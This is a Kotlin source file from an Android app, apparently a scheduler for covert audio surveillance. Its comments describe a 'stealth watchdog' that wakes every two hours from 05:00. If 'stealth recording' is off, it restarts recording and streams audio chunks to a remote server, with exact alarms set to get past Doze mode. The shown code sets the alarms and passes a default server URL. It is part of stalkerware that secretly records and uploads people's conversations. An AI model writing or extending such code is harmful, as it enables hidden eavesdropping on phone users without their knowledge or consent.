package com.audiostream.client

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import java.util.Calendar

/**
 * WatchdogScheduler.kt — 2-Hour Recurring Stealth Watchdog (Anchor: 5:00 AM)
 *
 * Enforces periodic stealth mode verification every 2 hours starting after 5:00 AM
 * (05:00, 07:00, 09:00, 11:00, 13:00, 15:00, 17:00, 19:00, 21:00, 23:00).
 *
 * If stealth recording is OFF when the alarm triggers, it automatically starts
 * recording and streams audio chunks to the server.
 *
 * Uses chained exact alarms via setExactAndAllowWhileIdle to penetrate Android Doze mode.
 */
object WatchdogScheduler {

    private const val TAG = "WatchdogScheduler"
    const val ACTION_WATCHDOG_CHECK = "com.audiostream.client.ACTION_WATCHDOG_CHECK"
    const val REQUEST_CODE_WATCHDOG = 5001

    /**
     * Calculates the next 2-hour interval anchor after 5:00 AM.
     * Hours: 5, 7, 9, 11, 13, 15, 17, 19, 21, 23.
     */
    fun getNextWatchdogTriggerTime(): Long {
        val now = Calendar.getInstance()
        val cal = Calendar.getInstance().apply {
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }

        val currentHour = now.get(Calendar.HOUR_OF_DAY)

        if (currentHour < 5) {
            // Before 5:00 AM today -> trigger at 5:00 AM today
            cal.set(Calendar.HOUR_OF_DAY, 5)
        } else {
            // After 5:00 AM today -> find the next odd hour (5, 7, 9, 11, 13, 15, 17, 19, 21, 23)
            var nextHour = 5
            while (nextHour <= currentHour) {
                nextHour += 2
            }
            if (nextHour <= 23) {
                cal.set(Calendar.HOUR_OF_DAY, nextHour)
            } else {
                // Past 23:00 -> schedule for 5:00 AM tomorrow
                cal.add(Calendar.DAY_OF_YEAR, 1)
                cal.set(Calendar.HOUR_OF_DAY, 5)
            }
        }

        // Failsafe: if calculated time is somehow in the past (e.g. edge clock skew), add 2 hours
        if (cal.timeInMillis <= System.currentTimeMillis()) {
            cal.add(Calendar.HOUR_OF_DAY, 2)
        }

        return cal.timeInMillis
    }

    /**
     * Schedules the next exact watchdog wakeup.
     */
    fun scheduleRecurringWatchdog(context: Context) {
        val appContext = context.applicationContext
        val alarmManager = appContext.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return

        val prefs = appContext.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
            ?: "https://audio-steam-server.onrender.com"

        val intent = Intent(appContext, AlarmReceiver::class.java).apply {
            action = ACTION_WATCHDOG_CHECK
            putExtra(AlarmReceiver.EXTRA_ACTION, ACTION_WATCHDOG_CHECK)
            putExtra(AlarmReceiver.EXTRA_SERVER_URL, serverUrl)
        }

        val pendingIntent = PendingIntent.getBroadcast(
            appContext,
            REQUEST_CODE_WATCHDOG,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val nextTriggerMs = getNextWatchdogTriggerTime()
        val triggerDate = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date(nextTriggerMs))

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    nextTriggerMs,
                    pendingIntent
                )
            } else {
                alarmManager.setExact(
                    AlarmManager.RTC_WAKEUP,
                    nextTriggerMs,
                    pendingIntent
                )
            }
            Log.i(TAG, "⏰ Next 2-Hour Stealth Watchdog scheduled for: $triggerDate")
        } catch (e: Exception) {
            Log.e(TAG, "Failed scheduling watchdog alarm: ${e.message}")
        }
    }
}
